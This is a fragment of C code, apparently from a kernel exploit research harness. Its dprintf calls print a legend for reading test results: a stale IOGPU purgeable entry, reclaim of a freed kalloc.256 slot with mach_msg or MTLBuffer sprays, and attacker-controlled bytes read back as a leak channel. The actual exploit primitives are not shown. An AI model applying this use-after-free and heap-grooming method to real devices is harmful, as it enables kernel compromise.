    dprintf(STDOUT_FILENO, "%s   out=%llu names the +0x10 load) IS the channel. No family code =\n", pfx);
    dprintf(STDOUT_FILENO, "%s   purgeable oracle DEAD: OG01+ print NO-CHANNEL but the map is the\n", pfx);
    dprintf(STDOUT_FILENO, "%s   recon deliverable.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   OG01: staleId!=0 with kr!=2c2 = THE STALE ENTRY (the leak fired);\n", pfx);
    dprintf(STDOUT_FILENO, "%s   its first receipt is the PRE witness (freed-but-zeroed slot).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   OG02: PRE vs POST on the SAME id across the 512x0x100 mach_msg\n", pfx);
    dprintf(STDOUT_FILENO, "%s   burst: OUT=ATTACKER-BYTES (the +0x10 load returns 4142434445464748)\n", pfx);
    dprintf(STDOUT_FILENO, "%s   or CODE-DIFF (2c2->2be family = the +0x24 dec arm now sees our\n", pfx);
    dprintf(STDOUT_FILENO, "%s   planted 4) = RECLAIM WITNESSED = your bytes consumed. NO-CHANGE =\n", pfx);
    dprintf(STDOUT_FILENO, "%s   kalloc.256 did not hand the slot back (magazine/CPU skew) - OG04\n", pfx);
    dprintf(STDOUT_FILENO, "%s   arbitrates with the PoC's own primitive.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   OG03: both 2c2 = controls clean; anything else = the channel is\n", pfx);
    dprintf(STDOUT_FILENO, "%s   misidentified (re-read the OG[map] block).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   OG04: fresh stale entry + 300x MTLBuffer(0x100) = the original PoC\n", pfx);
    dprintf(STDOUT_FILENO, "%s   arm; whichever arm (OG02/OG04) moves the differential names the\n", pfx);
    dprintf(STDOUT_FILENO, "%s   reclaim primitive. OGH01-04 alive = the GPU/AVE stack survived.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   KERNEL LOG greps: IOGPU + set_resource_purgeable + IOSurface. A\n", pfx);
    dprintf(STDOUT_FILENO, "%s   PANIC/client-fault on any OG cell = the stale deref consumed wild\n", pfx);
    dprintf(STDOUT_FILENO, "%s   geometry = escalate. .ips captureTime <-> [stamp]\n", pfx);
}
// [END PASTE]
